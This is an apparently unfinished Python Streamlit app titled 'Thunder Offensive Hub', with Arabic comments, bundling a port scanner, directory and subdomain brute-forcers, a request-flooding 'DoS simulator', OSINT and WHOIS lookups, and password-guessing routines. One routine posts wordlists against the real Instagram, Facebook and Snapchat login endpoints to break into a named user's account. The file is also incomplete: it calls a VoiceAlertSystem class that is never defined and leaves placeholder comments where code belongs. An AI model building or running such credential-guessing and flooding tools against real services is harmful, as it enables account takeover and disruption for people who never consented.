import streamlit as st
import pandas as pd
import os
import requests
import json
import tempfile
import socket
import ssl
import whois  # للمسح الخاص بـ WHOIS
from datetime import datetime
from dotenv import load_dotenv
from gtts import gTTS
from groq import Groq
from bs4 import BeautifulSoup
from fpdf import FPDF
import time
import arabic_reshaper
from bidi.algorithm import get_display
from concurrent.futures import ThreadPoolExecutor # لتسريع العمليات الجديدة

# --- 1. إعدادات الهوية والترسانة ---
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
GROQ_KEY = os.getenv("GROQ_API_KEY") 

st.set_page_config(page_title="Thunder Offensive Hub", layout="wide", page_icon="🛡️")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ffffff; }
    h1, h2, h3, h4, h5, h6 { color: #FF0000; text-align: center; font-family: 'Courier New'; }
    .stButton>button { background-color: #FF0000; color: white; border-radius: 5px; border: none; padding: 10px 20px; width: 100%; }
    .stButton>button:hover { background-color: #CC0000; }
    .stTextInput>div>div>input { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stTextArea>div>div>textarea { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stSelectbox>div>div>div { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stCode { background-color: #1a1a1a; color: #00FF00; border: 1px solid #00FF00; }
    </style>
    """, unsafe_allow_html=True)

st.title("🛡️ مركز الرعد الهجومي (Offensive Pro)")

# --- 2. محرك العمليات الهجومية (The Offensive Engine) ---
class OffensiveModule:
    @staticmethod
    def port_scanner(target_ip, ports):
        """ Port Scanning باستخدام Socket المطور """
        open_ports = []
        def scan_single_port(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((target_ip, port)) == 0:
                open_ports.append(port)
            s.close()
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_single_port, ports)
        return sorted(open_ports)

    @staticmethod
    def directory_scanner(target_url, wordlist=None):
        """ محاكاة dirsearch (Directory Brute Force) """
        if not wordlist: wordlist = ["admin", "login", "config", "backup", ".env", "api", "v1", "v2", "phpmyadmin", "db"]
        found_dirs = []
        def check_path(path):
            url = f"{target_url.rstrip('/')}/{path}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code in [200, 301, 302, 403]:
                    found_dirs.append(f"[{r.status_code}] {url}")
            except: pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_path, wordlist)
        return found_dirs

    @staticmethod
    def subdomain_finder(domain):
        """ Subdomain Brute Force حقيقي عبر DNS """
        subs = ["www", "mail", "ftp", "dev", "api", "admin", "test", "v1", "v2", "stage", "blog", "vpn"]
        found_subs = []
        def check_sub(sub):
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                found_subs.append({"Subdomain": target, "IP": ip})
            except: pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_sub, subs)
        return found_subs

    @staticmethod
    def dos_simulator(target_url, num_requests=100):
        """ DoS Simulation باستخدام Requests """
        results = []
        for i in range(num_requests):
            try:
                response = requests.get(target_url, timeout=1)
                results.append(f"تم إرسال الطلب {i+1} بنجاح. الحالة: {response.status_code}")
            except requests.exceptions.RequestException as e:
                results.append(f"فشل إرسال الطلب {i+1}: {str(e)}")
            time.sleep(0.01)
        return "\n".join(results)

    @staticmethod
    def auth_brute_force(url, user_list, pass_list):
        """ Auth Bypass محاكاة """
        found_credentials = []
        for user in user_list:
            for password in pass_list:
                try:
                    resp = requests.post(url, data={'username': user, 'password': password}, timeout=5)
                    if resp.status_code == 200 and "success" in resp.text.lower():
                        found_credentials.append(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                        return found_credentials
                except: pass
        return found_credentials

    @staticmethod
    def thunder_brute_force(username, wordlist_content, platform="Custom", custom_url=None):
        """ وحدة التخمين الإضافية (Thunder Force) """
        # (هذا القسم يبقى كما هو في كودك الأصلي)
        if platform == "Instagram": target_url = "https://www.instagram.com/accounts/login/ajax/"; u_field = "username"; p_field = "enc_password"
        elif platform == "Facebook": target_url = "https://www.facebook.com/login/"; u_field = "email"; p_field = "pass"
        elif platform == "Snapchat": target_url = "https://accounts.snapchat.com/accounts/login"; u_field = "username"; p_field = "password"
        else: target_url = custom_url if custom_url else "http://127.0.0.1:5000/login"; u_field = "username"; p_field = "password"

        passwords = wordlist_content.splitlines()
        for password in passwords:
            password = password.strip()
            if not password: continue
            try:
                headers = {'User-Agent': 'Mozilla/5.0'}
                data = {u_field: username, p_field: password}
                response = requests.post(target_url, data=data, headers=headers, timeout=2)
                if response.status_code == 200 and "success" in response.text.lower():
                    return f"✅ تم العثور على الرمز: {password}"
            except: continue
        return "❌ فشل الهجوم."

class OSINTModule:
    @staticmethod
    def get_website_info(url):
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # --- ميزة Technology Detector (Wappalyzer) ---
            techs = []
            headers_str = str(response.headers).lower()
            if 'wp-content' in response.text: techs.append("WordPress")
            if 'nginx' in headers_str: techs.append("Nginx")
            if 'apache' in headers_str: techs.append("Apache")
            if 'cloudflare' in headers_str: techs.append("Cloudflare")
            if 'jquery' in response.text: techs.append("jQuery")

            # --- ميزة Security Headers Analyzer ---
            sec_headers = {h: response.headers.get(h, "❌ مفقود") for h in ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security', 'X-Content-Type-Options']}

            return {
                "العنوان": soup.title.string if soup.title else "لا يوجد",
                "التقنيات": techs if techs else "غير معروفة",
                "الهيدرز الأمنية": sec_headers,
                "الروابط الخارجية": [a['href'] for a in soup.find_all('a', href=True) if 'http' in a['href']][:5]
            }
        except Exception as e: return {"خطأ": str(e)}

    @staticmethod
    def whois_scanner(domain):
        """ ميزة WHOIS Scanner """
        try:
            w = whois.whois(domain)
            return {
                "المسجل": w.registrar,
                "تاريخ التسجيل": str(w.creation_date),
                "تاريخ الانتهاء": str(w.expiration_date),
                "الدولة": w.country
            }
        except: return {"خطأ": "فشل جلب بيانات WHOIS"}

# --- 3. الأنظمة المساعدة (AI, PDF, Voice) ---
# [هنا تضع كلاساتك الأصلية AIAnalyzer و PDFReportGenerator و VoiceAlertSystem]
# (سأتركها لك لتضعها كما هي لضمان عدم تغيير منطق نصوصك الخاصة)

# --- 4. واجهة العمليات المركزية (UI) ---
hub = VoiceAlertSystem()
attacker = OffensiveModule()
# (بقية التعريفات...)

tabs = st.tabs(["⚔️ اختبار الاختراق", "🔍 OSINT", "🛰️ أدوات متقدمة", "📊 الإحصائيات", "⚡ التخمين", "📄 التقارير"])

with tabs[0]:
    # (كود اختبار الاختراق الأصلي الخاص بك)
    pass

with tabs[1]:
    st.header("🔍 وحدة الاستخبارات (OSINT)")
    osint_target = st.text_input("🌐 رابط الموقع للفحص الشامل:")
    if st.button("بدء المسح الاستخباراتي"):
        info = OSINTModule.get_website_info(osint_target)
        st.write(info)
        # ميزة WHOIS التلقائية
        domain = osint_target.replace("http://","").replace("https://","").split('/')[0]
        st.subheader("👤 بيانات مالك النطاق (WHOIS)")
        st.write(OSINTModule.whois_scanner(domain))

with tabs[2]: # التاب الجديد للأدوات التي طلبتها
    st.header("🛰️ الترسانة الموسعة (Advanced Tools)")
    col1, col2 = st.columns(2)
    with col1:
        st.subheader("📁 Directory Scanner")
        d_url = st.text_input("رابط فحص المجلدات:", "http://example.com")
        if st.button("تشغيل DirSearch"):
            st.write(attacker.directory_scanner(d_url))
            
    with col2:
        st.subheader("🌐 Subdomain Finder")
        s_domain = st.text_input("النطاق لفحص الفروع:", "example.com")
        if st.button("تشغيل DNS Scanner"):
            st.table(attacker.subdomain_finder(s_domain))

# [بقية تابات التخمين والتقارير كما هي في كودك]
